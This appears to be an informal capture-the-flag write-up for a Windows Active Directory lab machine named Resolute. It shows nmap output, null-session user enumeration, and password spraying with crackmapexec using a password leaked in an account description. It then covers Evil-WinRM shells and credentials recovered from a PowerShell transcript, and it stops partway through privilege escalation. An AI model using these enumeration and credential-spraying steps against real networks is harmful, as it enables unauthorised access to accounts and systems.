# Recon
```
─$ nmap -sC -sV 10.10.10.169
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 16:25 EEST
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 15.28% done; ETC: 16:25 (0:00:22 remaining)
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 88.08% done; ETC: 16:26 (0:00:05 remaining)
Nmap scan report for 10.10.10.169
Host is up (0.30s latency).
Not shown: 964 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
3/tcp     filtered compressnet
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-08 12:33:33Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
211/tcp   filtered 914c-g
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
800/tcp   filtered mdbs_daemon
1043/tcp  filtered boinc
1334/tcp  filtered writesrv
1503/tcp  filtered imtc-mcs
1935/tcp  filtered rtmp
2717/tcp  filtered pn-requester
2967/tcp  filtered symantec-av
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3324/tcp  filtered active-net
3851/tcp  filtered spectraport
3920/tcp  filtered exasoftport1
5120/tcp  filtered barracuda-bbs
5414/tcp  filtered statusd
5678/tcp  filtered rrac
6346/tcp  filtered gnutella
8200/tcp  filtered trivnet1
9001/tcp  filtered tor-orport
9090/tcp  filtered zeus-admin
9593/tcp  filtered cba8
9917/tcp  filtered unknown
10024/tcp filtered unknown
49165/tcp filtered unknown
49175/tcp filtered unknown
50300/tcp filtered unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 1h27m06s, deviation: 4h02m30s, median: -52m54s
| smb2-time: 
|   date: 2023-08-08T12:33:42
|_  start_date: 2023-08-08T12:23:27
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2023-08-08T05:33:44-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.30 seconds
```
- since the machine is still booting up i may run the nmap cammand later
- we found smb 445 so smbclinet and smbmap no luck with them
- we try the rpcclient but no luck but i try with null authenticayion and it works
```
rpcclient -U "" -N 10.10.10.169
```
- try to enumurate users by (enumdomusers and queryusers)
- copy all user and put itin text file and filter using
```
at user.txt | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users.txt
```
- now use crackmapexec to find lockut policy to check if we can bruteforce
```
─$ crackmapexec smb --pass-pol 10.10.10.169                               
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] Dumping password info for domain: MEGABANK
SMB         10.10.10.169    445    RESOLUTE         Minimum password length: 7
SMB         10.10.10.169    445    RESOLUTE         Password history length: 24
SMB         10.10.10.169    445    RESOLUTE         Maximum password age: Not Set
SMB         10.10.10.169    445    RESOLUTE         
SMB         10.10.10.169    445    RESOLUTE         Password Complexity Flags: 000000
SMB         10.10.10.169    445    RESOLUTE             Domain Refuse Password Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Store Cleartext: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Lockout Admins: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password No Clear Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password No Anon Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Complex: 0
SMB         10.10.10.169    445    RESOLUTE         
SMB         10.10.10.169    445    RESOLUTE         Minimum password age: 1 day 4 minutes 
SMB         10.10.10.169    445    RESOLUTE         Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.169    445    RESOLUTE         Locked Account Duration: 30 minutes 
SMB         10.10.10.169    445    RESOLUTE         Account Lockout Threshold: None
SMB         10.10.10.169    445    RESOLUTE         Forced Log off Time: Not Set

```
- so no lockout threshhold 
- get less information about all users with querydispinfo like description
```
rpcclient $> querydispinfo                                                                                                                                  
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
```
- find a password in user marko description
- we check creds with crackmapexec user marko and password is (Welcome123!) and we get logon failure
- we can try the user file we made
```
$ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!'             
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
```
- and we got a valid login with user melanie
- i did nmap again and port 5985 is opne so we try evilwinrm and we got a shell and the userflag
# Priv Esc
- i uploaded winpeas and run it and found no useful info 
- I went to the filesystem root 
- In PowerShell, ls is an alias for Get-ChildItem or gci. On windows, it’s often a good idea to run that with -force, kind of like running ls -a
- so in the filesystem i ran ls -force and found PSTranscript Directoty which seemd intersting after couple of directories we found a txt file
```
*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```
-there is a line which seemed pretty cool with creds on it
```
value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```
- so we have ryan and pass Serv3r4Admin4cc123!
- check the creds with crackmapexec
```
crackmapexec smb 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
crackmapexec winrm 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
```
- and we got pwnd
- i evilwinrm to ryan and got a shell
- after playing around with pathes i found  a note on the desktop
```
*Evil-WinRM* PS C:\Users\ryan\desktop> cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automaticallithin 1 minute
```
- 


